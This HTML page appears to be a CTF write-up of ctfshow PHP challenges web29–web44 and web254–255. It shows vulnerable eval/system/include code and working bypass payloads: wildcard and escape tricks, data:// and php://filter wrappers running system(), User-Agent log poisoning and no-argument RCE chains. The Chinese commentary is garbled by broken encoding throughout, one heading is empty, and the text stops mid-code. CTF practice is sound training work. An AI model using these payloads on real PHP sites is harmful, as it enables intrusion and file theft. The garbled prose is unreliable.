<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>ç®€å•çš„ç»•è¿‡</p>
<p><code>\ &#39;&#39; &quot; &quot; `` </code>éƒ½å¯ä»¥ç»•è¿‡ï¼ŒåŠ åœ¨flagé‡Œå°±è¡Œ</p>
<pre><code class="highlight plaintext">?c=system(&quot;cat fla\g.php&quot;);</code></pre>

<p>ç„¶åçœ‹æºç æ³¨é‡Šæ‰çš„éƒ¨åˆ†å³å¯</p>
<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code class="highlight plaintext">å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</code></pre>

<p>é‚£çœ‹æ¥è¿‡æ»¤å¾ˆä¸ä¸¥æ ¼äº†</p>
<pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>æ‡’å¾—çœ‹å¤šå‡ºæ¥çš„è¿‡æ»¤ï¼Œå’Œæˆ‘çš„é€šé…ç¬¦è¯´å»å§</p>
<pre><code class="highlight plaintext">?c=passthru(&quot;cat fl*&quot;);</code></pre>

<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>ä¸‰ç§æ–¹æ³•ï¼š</p>
<ul>
<li>ç©ºæ ¼æ›¿ä»£</li>
</ul>
<pre><code class="highlight plaintext">?c=echo%09`tac%09fl*`;//è¿™è¾¹&#123;IFS&#125;å‡ºäºæœªçŸ¥åŸå› æ˜¯ä¸å¯ç”¨çš„</code></pre>

<ul>
<li>evalä¼ å‚</li>
</ul>
<pre><code class="highlight plaintext">?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</code></pre>

<ul>
<li>æ— å‚æ•°</li>
</ul>
<pre><code class="highlight plaintext">eval(end(current(get_defined_vars())));&amp;b=system(&#x27;tac fl*&#x27;);
show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>

<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p>è¿™é‡Œä¸çœ‹è¿‡æ»¤å­—ç¬¦ä¸²(é—®å°±æ˜¯æ²¡å¿…è¦ï¼Œè¿˜æ²¡è¿‡æ»¤çš„å¾ˆæ­»)</p>
<p>çœ‹ä¸€çœ¼è¿‡æ»¤äº†</p>
<pre><code class="highlight plaintext">. ç©ºæ ¼ &#x27; ` ;  (</code></pre>

<p>æ‹¬å·éƒ½è¿‡æ»¤æ‰äº†å—ã€‚å“ˆåŸºcä½ è¿™å®¶ä¼™ï¼Œä½†æ˜¯ä¸å½±å“</p>
<p>è¿™é‡Œæ”¾å¼ƒç›´æ¥shellçš„æƒ³æ³•ï¼Œå°è¯•ç”¨ä¼ªåè®®ä½œä¸ºå¸®æ‰‹</p>
<pre><code class="highlight plaintext">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</code></pre>

<p>ä¸ºä»€ä¹ˆè¿™ä¸ª<code>?&gt;</code>å¯ä»¥ç”¨å‘¢?</p>
<p>çœ‹å…¶ä»–å¸ˆå‚…çš„è§£é‡Šè¯´æ˜¯<code>?&gt;</code>å¯ä»¥ é—­åˆ phpï¼ˆ ?&gt; é—­åˆçš„æ˜¯ eval é‡Œé¢çš„ php è¯­å¥ï¼Œeval åç»­è¿˜æœ‰è¯­å¥çš„è¯ï¼Œä¾æ—§æ˜¯ä¼šæ‰§è¡Œçš„ã€‚)</p>
<pre><code class="highlight plaintext">å…·ä½“çš„æ¥è¯´ï¼Œå¯¹äºinclude
ç©ºæ ¼æ˜¯ä¸ªå¯æœ‰å¯æ— çš„ä¸œè¥¿ï¼Œå³ä½¿æ²¡æœ‰ç©ºæ ¼å®ƒä¹Ÿèƒ½ä»ä¸Šä¸‹æ–‡ä¸­åˆ¤æ–­ $var æ˜¯å˜é‡ï¼Œå®ƒä¼šä¼˜å…ˆè§£æå˜é‡ï¼Œç„¶åå†å¤„ç†è¯­å¥ã€‚
?&gt;è¿™éƒ¨åˆ†åœ¨è¿™é‡Œä¹Ÿå¾ˆç¥å¿…ï¼Œevalè§£æphpè¯­å¥ï¼Œè€Œåé¢çš„?&gt;ç›´æ¥è¢«å½“ä½œäº†æ— æ•ˆæ–‡å­—ä¸è¢«å¤„ç†ï¼Œè€Œåœ¨?&gt;å‰çš„è¯­å¥ä¸åŠ ;æ˜¯æ— æ‰€è°“çš„</code></pre>

<p>å¤šè¯´æ— ç›Šï¼Œè‡ªå·±è°ƒä¸€çœ¼çœ‹çœ‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708105538411.png" alt="image-20250708105538411"></p>
<p>å¯ä»¥çœ‹åˆ°åé¢çš„è¯­å¥æ­£å¸¸æ‰§è¡Œäº†</p>
<p>phpï¼Œå¾ˆç¥å¥‡å§ã€‚ã€‚</p>
<pre><code class="highlight plaintext">base64æ˜¯ä»€ä¹ˆå‡ æŠŠï¼Œæˆ‘ç›´æ¥php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.phpå½“æ‡’ç‹—çˆ½èµ¤ğŸ˜‹</code></pre>



<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. ç©ºæ ¼ &#x27; ` ; ( &quot;</code></pre>

<p>åŒå¼•å·ä¹Ÿæ²¡äº†</p>
<p>ä½†æ˜¯æˆ‘å‰ä¸€ä¸ªå¥½åƒæ²¡ç”¨è¿‡â€â€å•Šã€‚ã€‚</p>
<p>ç§’èµ¤</p>
<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. ç©ºæ ¼ ` &#x27; ; ( : &quot;</code></pre>

<p>æœ¨å¤§æœ¨å¤§æœ¨å¤§ï¼æ²¡æœ‰å®è´¨ç”¨å¤„çš„è¿‡æ»¤å“’!å’Œä¸Šä¸Šä¸ªå‡‘ä¸€æ¡Œå»</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. ç©ºæ ¼ &#x27; ` ; ( : &quot; &lt; =</code></pre>

<p>å’Œä¸Šä¸Šä¸Šä¸ªä¸€æ¡Œ</p>
<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<pre><code class="highlight plaintext">. ç©ºæ ¼ &#x27; ` ; ( : &quot; &lt; = / æ•°å­—</code></pre>

<p>æ•°å­—æ¢æˆå­—æ¯</p>
<p>ç„¶åå’Œä¸Šä¸Šä¸Šä¸Šä¸ªä¸€æ¡Œ</p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre><code class="highlight plaintext">&lt;?php
//flag in flag.php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        include($c);
        echo $flag;
    
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>

<p>å—¯ã€‚ã€‚è¿™é‡Œç›´æ¥<code>include</code>äº†ï¼Œç›´æ¥ä¼ªåè®®å§</p>
<pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>

<p>è¿™é‡Œbase64æ˜¯<code>&lt;?php system(&#39;tac flag.php&#39;); ?&gt;</code></p>
<p>æˆ–è€…å…¶å®éƒ½èƒ½å‘½ä»¤æ‰§è¡Œäº†ä½ ç”¨<code>*</code>å·ä¸ªæ‡’ä¹Ÿæ²¡äº‹</p>
<p>è¿™é‡Œä¸ºä»€ä¹ˆ<code>php://input</code>ç”¨è°·æ­Œæµè§ˆå™¨çš„hackbarä¼šå‡ºç°æ‰§è¡Œä¸äº†çš„æƒ…å†µ(å› ä¸ºè¿™å•¥æ¯”postæ²¡æœ‰&#x3D;å°±å‘ä¸äº†åŒ…)</p>
<p>åªæœ‰åœ¨åŒ…æ‰‹åŠ¨æ”¹æ‰å¯ä»¥</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708121634882.png" alt="image-20250708121634882"></p>
<p>ä¹Ÿå¯ä»¥å°è¯•åŒ…å«ä¸€ä¸‹æ—¥å¿—</p>
<pre><code class="highlight plaintext">nginx çš„æ—¥å¿—æ–‡ä»¶ /var/log/nginx/access.log</code></pre>

<p>åŒ…å«å®Œå‘ç°è®°å½•äº†UAå¤´ï¼Œå°è¯•ä¸€ä¸‹UAå¤´æ³¨å…¥</p>
<p><code>User-Agent: &lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p>
<p>åœ¨&#x2F;è·¯ç”±ä¸‹æ³¨å…¥å†åŒ…å«å°±å¯ä»¥çœ‹åˆ°è¢«æ‰§è¡Œ</p>
<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="comment">//flag in flag.php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">include</span>(<span class="variable">$c</span>);
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p><del>ç®€ç›´è¯´çš„å’Œä½ ä¸Šä¸€é¢˜å¯ä»¥ç”¨è¿™fileä¸€æ ·</del></p>
<p>å’³å’³ï¼Œçœ‹åˆ°è¿‡æ»¤äº†<code>flag php file</code></p>
<p>è€ƒè™‘ç”¨dataä¼ªåè®®</p>
<pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>

<p><code>å¦ˆçš„å¿˜äº†è¿˜æœ‰çŸ­æ ‡ç­¾äº†ã€‚</code></p>
<pre><code class="highlight plaintext">?c=data://text/plain,&lt;?=system(&quot;tac fl*&quot;)?&gt;</code></pre>

<p>å½“ç„¶çš„å½“ç„¶è¿™é¢˜ç”¨æ—¥å¿—åŒ…å«è¿˜æ˜¯å¯ä»¥åš</p>
<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code class="highlight plaintext">&lt;?php
//flag in flag.php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        include($c.&quot;.php&quot;);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>ç”¨ä¸€ä¸ªå°å°çš„åç¼€ä¹±æˆ‘é“å¿ƒå—ã€‚ã€‚</p>
<pre><code class="highlight plaintext">?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;//
?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;&lt;?php</code></pre>

<p>ä¸¤ç§éƒ½è¡Œï¼Œæ€»ä¹‹é—­åˆæŠŠåé¢çš„å»æ‰å°±è¡Œ</p>
<p>ä½†æ˜¯å…¶å®ä¸å»ä¹Ÿè¡Œï¼Œèªæ˜çš„phpä¼šæŠŠåé¢çš„åç¼€å½“æˆhtmlç›´æ¥æ˜¾ç¤º</p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="variable">$c</span>);
    &#125;
        
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p>å•Šå‘€ï¼éª‡æ­»æˆ‘åŠ›</p>
<p>è¿‡æ»¤äº†æ•°å­—</p>
<pre><code class="highlight plaintext">~ ` @ # $ % ^ &amp; * ï¼ˆ ï¼‰ - = + &#123; &#125; [ ] : &#x27; &quot; , &lt; . &gt; / ? \</code></pre>

<p>ç¬¦å·åŸºæœ¬éƒ½ç”¨ä¸äº†äº†</p>
<p>ä½†æ˜¯æ‚¨çŒœæ€ä¹ˆç€?å“!ä»–è¿™æ˜¯ä¸ªä¸­æ–‡è¾“å…¥æ³•çš„æ‹¬å·</p>
<p>æ— å‚æ•°rceä¼ºå€™</p>
<pre><code class="highlight plaintext">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=session_start();system(session_id());</code></pre>

<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;
        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>æ— æ•°å­—å­—æ¯rce</p>
<p><code>~ $</code>ä¸ç»™ç”¨ï¼Œè‡ªå¢å–åå¼‚æˆ–éƒ½ç”¨ä¸äº†è¾£</p>
<p>ä¸å¼‚æˆ–èƒ½æ€ä¹ˆåŠå‘¢ã€‚ã€‚ä½ çœ‹è¿™é‡Œæ˜¯ä¸æ˜¯è¿˜æœ‰ä¸ª<code>|</code>å¯ä»¥ç”¨</p>
<p>åˆ©ç”¨æˆ–æ¥æ„é€ å­—ç¬¦å³å¯</p>
<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p><strong>è§£æ³•1</strong>ï¼š</p>
<p>åˆ©ç”¨||ç®¡é“ç¬¦çš„ç‰¹æ€§</p>
<p><code>å¦‚æœ||å·¦è¾¹çš„å‘½ä»¤ï¼ˆcommand1ï¼‰æœªæ‰§è¡ŒæˆåŠŸï¼Œé‚£ä¹ˆå°±æ‰§è¡Œ||å³è¾¹çš„å‘½ä»¤ï¼ˆcommand2ï¼‰ï¼›æˆ–è€…æ¢å¥è¯è¯´ï¼Œâ€œå¦‚æœè¿™ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥äº†||é‚£ä¹ˆå°±æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚</code></p>
<p><strong>è§£æ³•2</strong>:</p>
<p>æ¢è¡Œæ¥ç»•è¿‡ï¼Œè¿™ä¸ªè¯­å¥æœ¬èº«çš„æ„æ€å°±æ˜¯é‡å®šå‘è¾“å‡ºè¡¨ç¤ºä¸å›æ˜¾ï¼Œ(ä½ åœ¨åå¼¹shell&#x2F;ææƒçš„æ—¶å€™æˆ–è®¸è§åˆ°è¿‡å®ƒ)</p>
<pre><code class="highlight plaintext">?c=tac flag.php%0a</code></pre>

<p>æ‰€ä»¥åŒç†åªè¦èƒ½åˆ†å‰²å‘½ä»¤çš„åŸºæœ¬éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„</p>
<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;
        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>

<p><code>;</code>ä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯è®¡åˆ’é€š</p>
<p>åŒweb42</p>
<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code class="highlight plaintext">&lt;?php

if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c=$_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;
        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>æ¢é€šé…ç¬¦ï¼Œæ²¡äº†</p>
<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>
<span class="class"></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="variable">$u</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="variable">$p</span>) &#123;
            <span class="variable language_">$this</span>-&gt;isVip = <span class="literal">true</span>;
        &#125;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isVip) &#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span> . <span class="variable">$flag</span>;
        &#125; <span class="keyword">else</span> &#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;

<span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)) &#123;
    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
    <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;
        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>()) &#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125; <span class="keyword">else</span> &#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>

<p>å°±æ˜¯ç®€å•çš„ä¼ ã€‚åˆ«æƒ³æ­ªäº†(è°æƒ³æ­ªäº†æˆ‘ä¸è¯´)</p>
<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
        &#125;<span class="keyword">else</span>&#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;
<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
